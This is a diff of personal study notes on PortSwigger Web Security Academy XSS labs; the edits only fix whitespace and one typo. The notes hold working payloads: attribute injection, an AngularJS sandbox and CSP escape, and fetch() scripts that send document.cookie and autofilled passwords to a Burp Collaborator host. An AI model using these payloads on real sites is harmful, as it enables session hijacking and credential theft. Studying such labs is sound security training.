@@ -2498,8 +2498,8 @@ Content-Type: application/json
  
 **XSS in HTML tag attributes**  
 1. Reflected XSS into **attribute with angle brackets** HTML-encoded 
-  - Test `he123"` <input type="text" placeholder="Search the blog..." name="search" `value="he123" "=""`>  
-  - `"onmouseover="alert(1)` >	`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">`  
+   - Test `he123"` <input type="text" placeholder="Search the blog..." name="search" `value="he123" "=""`>  
+   - `"onmouseover="alert(1)` >	`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">`  
 2. Stored XSS into anchor **href attribute with double quotes** HTML-encoded  
    - <a id="author" `href="www.attacker1.com"`>attacker</a>
    - in website field, input `javascript:alert(1)` > `<a id="author" href="javascript:alert(1)">yuyu</a>`
@@ -2580,36 +2580,36 @@ Content-Type: application/json
       $scope.value = $parse(key)($scope.query);
       });
      ```  
-2. Reflected XSS with AngularJS sandbox escape and CSP (expoert)  
+2. Reflected XSS with AngularJS sandbox escape and CSP (expert)  
    - The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object
    - The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.
    - the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z
    - The function will only be called when the orderBy operation reaches the window object in the $event.path array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check
-   - Exploit server `search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';`
+   - Exploit server `search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';`  
      ```
       <script>
-	location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';  
+	 location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';  
       </script>
      ```
 **Exploiting XSS vulnerabilities**  
 1. Exploiting cross-site scripting to **steal cookies**  
-   - limitation: user not logged in, HttpOnly flag, block user IP, session time out	
-   - Post comment and capture the session value in Burp Collaborator
+   - limitation: user not logged in, HttpOnly flag, block user IP, session time out  	
+   - Post comment and capture the session value in Burp Collaborator   
      ```
-      <script>
+     <script>
 	fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
-	method: 'POST',
-	mode: 'no-cors',
-	body:document.cookie
+	  method: 'POST',
+	  mode: 'no-cors',
+	  body:document.cookie
 	});
-      </script>
+     </script>
      ```
 2. Exploiting cross-site scripting to **capture passwords**  
-   - Target password manager that performs **password auto-fill**	
+   - Target password manager that performs **password auto-fill**  	
    - Post comment and capture the password value in Burp Collaborator
      ```
-      <input name=username id=username>
-      <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+     <input name=username id=username>
+     <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
 	method:'POST',
 	mode: 'no-cors',
 	body:username.value+':'+this.value
@@ -2635,7 +2635,7 @@ Content-Type: application/json
 	    changeReq.send('csrf='+token+'&email=test@test.com')
 	};
       </script>
-     ```
+      ```
 **Content security policy (CSP)**
 1. Reflected XSS protected by very **strict CSP**, with **dangling markup attack**
    - Burp steps not working: follow `https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/`  
